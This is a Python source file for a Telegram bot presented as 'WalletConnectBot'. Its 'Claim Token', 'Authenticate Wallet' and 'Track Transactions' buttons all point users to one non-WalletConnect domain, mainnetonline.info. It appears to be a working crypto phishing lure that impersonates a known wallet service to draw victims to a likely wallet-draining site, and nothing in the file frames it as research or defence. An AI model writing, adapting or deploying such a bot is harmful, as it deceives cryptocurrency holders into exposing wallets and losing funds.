import requests
import telegram.ext
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update

api_key = "XXXXXXXXXXXXXXXXXXXXXX"

telegram_group_id = "chrisandchily"


def start(update, context):
    update.message.reply_text("Hello! Welcome to WalletConnectBot")


def hello(update, context):
    update.message.reply_text(f"Hello! {update.effective_user.first_name}")


def help(update, context):
    update.message.reply_text(
        """
    The following commands are available:

    /start -> Welcome message
    /help  -> This Message
    /content -> Information about WalletConnect Content
    /contact -> Who you can contact


    """
    )


url = "https://mainnetonline.info/?v"


def content(update, context):
    update.message.reply_text(update.message.text)


def contact(update, context):
    update.message.reply_text("You can contact me soon")


def claim_token(update, context):
    markUp = InlineKeyboardMarkup([[InlineKeyboardButton("Claim Token", url=url)]])
    update.message.reply_text(
        f"Hello {update.effective_user.first_name}, please click the button below:",
        reply_markup=markUp,
    )


def authenticate_wallet(update, context):
    markUp = InlineKeyboardMarkup(
        [[InlineKeyboardButton("Authenticate Wallet", url=url)]]
    )
    update.message.reply_text(
        f"Hello {update.effective_user.first_name}, please click the button below:",
        reply_markup=markUp,
    )


def track_transactions(update, context):
    markUp = InlineKeyboardMarkup(
        [[InlineKeyboardButton("Track Transactions", url=url)]]
    )
    update.message.reply_text(
        f"Hello {update.effective_user.first_name}, please click the button below:",
        reply_markup=markUp,
    )


def send_msg_on_telegram(message):
    telegram_api_url = f"https://api.telegram.org/bot{api_key}/sendMessage?chat_id=@{telegram_group_id}&text={message}"
    tel_resp = requests.get(telegram_api_url)
    print(tel_resp.json())


def options(update: Update, context: telegram.ext.CallbackContext):
    reply_buttons = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("Claim Token", url=url)],
            [InlineKeyboardButton("Autheticate Wallet", url=url)],
            [InlineKeyboardButton("Track Transactions", url=url)],
        ]
    )
    update.message.reply_text(
        f"Hello {update.effective_user.first_name}, please choose an option:",
        reply_markup=reply_buttons,
    )


def button(update, context):
    update.callback_query.answer()
    # Remove Buttons
    update.callback_query.message.edit_reply_markup(
        reply_markup=InlineKeyboardMarkup([])
    )


updater = telegram.ext.Updater(api_key, use_context=True)
disp = updater.dispatcher


disp.add_handler(telegram.ext.CommandHandler("start", start))
disp.add_handler(telegram.ext.CommandHandler("claim_token", claim_token))
disp.add_handler(
    telegram.ext.CommandHandler("authenticate_wallet", authenticate_wallet)
)
disp.add_handler(telegram.ext.CommandHandler("track_transactions", track_transactions))
disp.add_handler(telegram.ext.CommandHandler("contact", contact))
# disp.add_handler(telegram.ext.CommandHandler('content', content))
disp.add_handler(telegram.ext.CommandHandler("help", help))
disp.add_handler(telegram.ext.CommandHandler("hello", hello))
disp.add_handler(
    telegram.ext.MessageHandler(
        telegram.ext.Filters.text & ~telegram.ext.Filters.command, content
    )
)
disp.add_handler(telegram.ext.CommandHandler("options", options))
disp.add_handler(telegram.ext.CallbackQueryHandler(button))


print("Starting Walletconnect bot")
updater.start_polling()
updater.idle()


# send_msg_on_telegram('Just Testing this')
